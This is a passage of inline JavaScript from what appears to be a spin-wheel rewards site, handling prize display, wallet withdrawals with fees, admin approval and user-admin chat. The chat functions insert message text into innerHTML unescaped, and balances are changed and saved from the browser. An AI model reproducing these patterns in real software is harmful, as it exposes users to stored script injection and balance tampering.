saveUsersToDB(users).then(()=>{ document.getElementById('wheel-bal-display').innerText='$'+users[idx].wheelBalance.toFixed(2); document.getElementById('rem-spins').innerText=Math.max(0,(users[idx].wheelLimit||0)-users[idx].spinsUsed); document.getElementById('spinResult').innerText='You Won $'+prize+'!'; let pop=document.getElementById('winPopup'); document.getElementById('popup-amt').innerText=prize; pop.classList.add('show'); setTimeout(()=>pop.classList.remove('show'),2500); }); } } requestAnimationFrame(anim); }
async function requestWithdrawal(){ let sel=document.getElementById('wd_amount'); if(!sel) return; let amt=parseFloat(sel.value); let addr=document.getElementById('wd_address').value.trim(); if(!addr){ alert('Enter wallet'); return; } let fees={25:1,30:2.35,40:3,50:4,100:5,150:6,500:8}; let fee=fees[amt]||1; let net=amt-fee; let users=await fetchUsersFromDB(); let idx=users.findIndex(x=>x.email===loggedUser); if(idx===-1) return; if(users[idx].balance<amt){ alert('Insufficient balance need $'+amt); return; } if(amt<25){ alert('Min $25'); return; } users[idx].balance-=amt; if(!users[idx].withdrawals) users[idx].withdrawals=[]; users[idx].withdrawals.push({amount:amt,fee,netAmount:net,address:addr,date:new Date().toLocaleString(),status:'Pending'}); await saveUsersToDB(users); alert('Withdrawal request $'+amt+' submitted Net $'+net); render(); }
async function approveWithdrawal(ui,wi){ let users=await fetchUsersFromDB(); if(users[ui] && users[ui].withdrawals[wi]){ users[ui].withdrawals[wi].status='Approved'; await saveUsersToDB(users); alert('Approved'); render(); } }
async function rejectWithdrawal(ui,wi){ let users=await fetchUsersFromDB(); if(users[ui] && users[ui].withdrawals[wi]){ let w=users[ui].withdrawals[wi]; if(w.status!=='Rejected'){ users[ui].balance+=w.amount; } w.status='Rejected'; await saveUsersToDB(users); alert('Rejected & Refunded'); render(); } }
async function loadUserChats(){ let chats=await fetchChatsFromDB(); let box=document.getElementById('user-chat-box'); if(!box) return; let my=chats.filter(c=>c.from===loggedUser||c.to===loggedUser||c.to==='admin'); box.innerHTML=my.map(m=>`<div class="msg ${m.from===loggedUser?'msg-user':'msg-admin'}"><b>${m.from===loggedUser?'You':'Admin'}:</b> ${m.text}</div>`).join(''); box.scrollTop=box.scrollHeight; }
async function sendUserChat(){ let inp=document.getElementById('user_msg'); if(!inp||!inp.value.trim()) return; let chats=await fetchChatsFromDB(); chats.push({from:loggedUser,to:'admin',text:inp.value.trim(),time:Date.now()}); await saveChatsToDB(chats); inp.value=''; loadUserChats(); }
async function loadAllAdminSpecificChats(){ let chats=await fetchChatsFromDB(); let users=await fetchUsersFromDB(); users.forEach((u,i)=>{ let box=document.getElementById('specific-chat-'+i); if(!box) return; let f=chats.filter(c=>c.from===u.email||c.to===u.email); box.innerHTML=f.map(m=>`<div class="msg ${m.from==='admin'?'msg-admin':'msg-user'}"><b>${m.from}:</b> ${m.text}</div>`).join(''); box.scrollTop=box.scrollHeight; }); }
async function sendAdminSpecificChat(email,idx){ let inp=document.getElementById('admin_msg_'+idx); if(!inp||!inp.value.trim()) return; let chats=await fetchChatsFromDB(); chats.push({from:'admin',to:email,text:inp.value.trim(),time:Date.now()}); await saveChatsToDB(chats); inp.value=''; loadAllAdminSpecificChats(); }
</script></body></html>
